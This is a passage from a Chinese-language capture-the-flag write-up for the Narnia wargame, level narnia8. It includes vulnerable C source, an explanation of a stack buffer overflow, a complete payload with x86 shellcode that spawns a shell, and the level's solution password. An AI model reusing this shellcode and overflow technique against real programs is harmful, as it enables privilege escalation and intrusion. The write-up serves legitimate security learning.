class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">char</span> *b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">char</span> *blah=b;</span><br><span class="line">	<span class="keyword">char</span> bok[<span class="number">20</span>];</span><br><span class="line">	<span class="comment">//int i=0;</span></span><br><span class="line">	</span><br><span class="line">	<span class="built_in">memset</span>(bok, <span class="string">'\0'</span>, <span class="keyword">sizeof</span>(bok));</span><br><span class="line">	<span class="keyword">for</span>(i=<span class="number">0</span>; blah[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">		bok[i]=blah[i];</span><br><span class="line"></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s\n"</span>,bok);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span>&#123;</span><br><span class="line">        </span><br><span class="line">	<span class="keyword">if</span>(argc &gt; <span class="number">1</span>)       </span><br><span class="line">		func(argv[<span class="number">1</span>]);</span><br><span class="line">	<span class="keyword">else</span>    </span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%s argument\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="writeup-8"><a href="#writeup-8" class="headerlink" title="writeup"></a>writeup</h2><ol>
+<li><p>在<code>func</code>函数里<code>bok</code>会造成缓冲区溢出，没有其他函数的帮忙，这里需要我们自己写入 shellcode，覆盖<code>func</code>的返回地址。</p>
+</li>
+<li><p><code>bok</code>比<code>blah</code>地址低且紧密相连，</p>
+ <figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>; blah[i] != <span class="string">'\0'</span>; i++)</span><br><span class="line">    bok[i]=blah[i];</span><br></pre></td></tr></table></figure>
+
+<p> 在给<code>bok</code>赋值时，如果<code>argv[1]</code>的长度超过 20，<code>bok</code>就会覆盖<code>blah</code>的值，而<code>blah</code>存放着<code>argv[1]</code>的基地址指针，修改后就不能正确访问我们的输入字符串了。</p>
+</li>
+<li><p>要想办法找到<code>blah</code>原来的值（即输入字符串的基地址），在输入较长的 payload 时注意把输入字符串的基地址覆盖回去，这样就能将后续的输入内容拷贝到<code>bok</code>中去，进而修改<code>func</code>的返回地址。</p>
+</li>
+<li><p>先借助反汇编<code>func</code>函数部分，我们在<code>func</code>中的<code>printf</code>处设置断点<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqmc3881t2j20km0e0wng.jpg" alt></p>
+</li>
+<li><p>由于<code>bok</code>是 20 个字节的缓冲区，我们只需覆盖 20 个字节即可看到 blah 的值<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqmcig83msj20ng0awqf5.jpg" alt><br>即<code>0xffffd5fc</code>处的<code>0xffffd802</code>，它与<code>0xffffd610</code>处的值相同，而这应该就是<code>b</code>所在位置</p>
+</li>
+<li><p>我们尝试用<code>\x02\xd8\xff\xff</code>覆盖<code>blah</code><br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqmck964b9j20np0di17v.jpg" alt><br>发现<code>b</code>和<code>blah</code>的地址不一致，而且由于我们增加了<code>\x02\xd8\xff\xff</code>四个字节，<code>b</code>的地址相对于刚才减少了 4</p>
+</li>
+<li><p>当我们将地址改成<code>\xfe\xd7\xff\xff</code><br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqmcofkxfbj20og0cpdpe.jpg" alt><br>又和<code>b</code>的值一致了。经过多次测试我们发现，缓冲区的限制是 20 个字节，计字符串长度为 n+20，则字符串基址将相应地减少 n。比如像这样：<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqmctn2wukj20og08btdr.jpg" alt><br><code>0xffffd7ee</code>的地址计算方法为：<code>0xffffd802 - 4 - 12 - 4</code>，这里也很容易看出，<code>func</code>函数的返回地址存放在<code>ABCD</code>所在位置处，因此，我们只需将其改成 shellcode 的地址即可</p>
+</li>
+<li><p>接下来，我们需要知道程序执行时<code>blah</code>的实际值<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqmdabq4aej20n102xjtd.jpg" alt><br>然后按照上面的步骤，<code>0xffffd80a - 4 - 12 - 4 - 44 = 0xffffd7ca</code>，后面 44 字节是 shellcode 的长度，然后计算 shellcode 的地址<code>0xffffd7ca + 20 + 4 + 12 + 4 = 0xffffd7f2</code>作为第二个 4 字节的值，于是成功构造了pyaload：<br><img src="http://ww1.sinaimg.cn/large/a105112bly1fqmde1o5elj20oi06i0y1.jpg" alt></p>
+<h2 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./narnia8 $(python -c <span class="string">'print "A" * 20 + "\xca\xd7\xff\xff" + "\x90" * 12 + "\xf2\xd7\xff\xff" + "\x31\xc0\xb0\xc9\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\xcb\xcd\x80\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"'</span>)</span><br></pre></td></tr></table></figure>
+
+</li>
+</ol>
+<h2 id="solution-8"><a href="#solution-8" class="headerlink" title="solution"></a>solution</h2><ul>
+<li><code>eiL5fealae</code></li>
+</ul>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><ul>
+<li>还是太菜了，前后断断续续花了一个多礼拜才写完。对于一些底层基础还是不够扎实，比如 level 7 中的 ret2lib 也是照葫芦画瓢，对程序的装载、链接、空间分配等还是不太了解。</li>
+<li>要多读书多实践 :)</li>
+</ul>
+<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
+<li><a href="https://blog.csdn.net/HappyOrange2014/article/details/51125038" target="_blank" rel="noopener">通过GOT覆写实现ret2libc - 64-bit Linux stack smashing tutorial: Part 3</a></li>
+<li><a href="https://www.anquanke.com/post/id/83835" target="_blank" rel="noopener">CCTF pwn3格式化字符串漏洞详细writeup</a></li>
+</ol>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+      <div>
+        <ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>Post author:</strong>
+    Or1onX
+  </li>
+  <li class="post-copyright-link">
+    <strong>Post link:</strong>
+    <a href="https://or1onx.github.io/narnia-writeup/" title="narnia writeup">https://or1onx.github.io/narnia-writeup/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice: </strong>
+    All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> unless stating additionally.
+  </li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/bin-shellcode-narnia/" rel="tag"># bin shellcode narnia</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/初探缓冲区溢出/" rel="next" title="初探缓冲区溢出">
+                <i class="fa fa-chevron-left"></i> 初探缓冲区溢出
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/C++优先队列实现哈夫曼编码/" rel="prev" title="C++优先队列实现哈夫曼编码">
+                C++优先队列实现哈夫曼编码 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            Table of Contents
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            Overview
+          </li>
+        </ul>
+      
+
+      <section class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/images/Or1onX.jpg" alt="Or1onX">
+            
+              <p class="site-author-name" itemprop="name">Or1onX</p>
+              <p class="site-description motion-element" itemprop="description">Stay hungry, stay foolish.</p>
+          </div>
+
+          <nav class="site-state motion-element">
+
+            
+              <div class="site-state-item site-state-posts">
+              
+                <a href="/archives/">
+              
+                  <span class="site-state-item-count">15</span>
+                  <span class="site-state-item-name">posts</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-categories">
+                <a href="/categories/index.html">
+                  <span class="site-state-item-count">3</span>
+                  <span class="site-state-item-name">categories</span>
+                </a>
+              </div>
+            
+
+            
+              
+              
+              <div class="site-state-item site-state-tags">
+                <a href="/tags/index.html">
+                  <span class="site-state-item-count">12</span>
+                  <span class="site-state-item-name">tags</span>
+                </a>
+              </div>
+            
+
+          </nav>
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+          
+
+          
+          
+
+          
+
+        </div>
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#前言"><span class="nav-text">前言</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-1-narnia0-gt-narnia1"><span class="nav-text">level 1: narnia0 -&gt; narnia1</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#source-code"><span class="nav-text">source code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#writeup"><span class="nav-text">writeup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#solution"><span class="nav-text">solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-2-narnia1-gt-narnia2"><span class="nav-text">level 2: narnia1 -&gt; narnia2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#source-code-1"><span class="nav-text">source code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#writeup-1"><span class="nav-text">writeup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-1"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#solution-1"><span class="nav-text">solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-3-narnia2-gt-narnia3"><span class="nav-text">level 3: narnia2 -&gt; narnia3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#source-code-2"><span class="nav-text">source code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#writeup-2"><span class="nav-text">writeup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-2"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#solution-2"><span class="nav-text">solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-4-narnia3-gt-narnia4"><span class="nav-text">level 4: narnia3 -&gt; narnia4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#source-code-3"><span class="nav-text">source code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#writeup-3"><span class="nav-text">writeup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-3"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#solution-3"><span class="nav-text">solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-5-narnia4-gt-narnia5"><span class="nav-text">level 5: narnia4 -&gt; narnia5</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#source-code-4"><span class="nav-text">source code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#writeup-4"><span class="nav-text">writeup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-4"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#solution-4"><span class="nav-text">solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-6-narnia5-gt-narnia6"><span class="nav-text">level 6: narnia5 -&gt; narnia6</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#source-code-5"><span class="nav-text">source code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#writeup-5"><span class="nav-text">writeup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-5"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#solution-5"><span class="nav-text">solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-7-narnia6-gt-narnia7"><span class="nav-text">level 7: narnia6 -&gt; narnia7</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#source-code-6"><span class="nav-text">source code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#writeup-6"><span class="nav-text">writeup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-6"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#solution-6"><span class="nav-text">solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-8-narnia7-gt-narnia8"><span class="nav-text">level 8: narnia7 -&gt; narnia8</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#source-code-7"><span class="nav-text">source code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#writeup-7"><span class="nav-text">writeup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-7"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#solution-7"><span class="nav-text">solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#level-9-narnia8-gt-narnia9"><span class="nav-text">level 9: narnia8 -&gt; narnia9</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#source-code-8"><span class="nav-text">source code</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#writeup-8"><span class="nav-text">writeup</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#payload-8"><span class="nav-text">payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#solution-8"><span class="nav-text">solution</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#总结"><span class="nav-text">总结</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#参考"><span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Or1onX</span>
+
+  
+</div>
+
+
+  <div class="powered-by">Powered by <a rel="external nofollow" class="theme-link" target="_blank" href="https://hexo.io">Hexo</a></div>
+
+
+
+  <span class="post-meta-divider">|</span>
+
+
+
+  <div class="theme-info">Theme &mdash; <a rel="external nofollow" class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
+
+
+
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
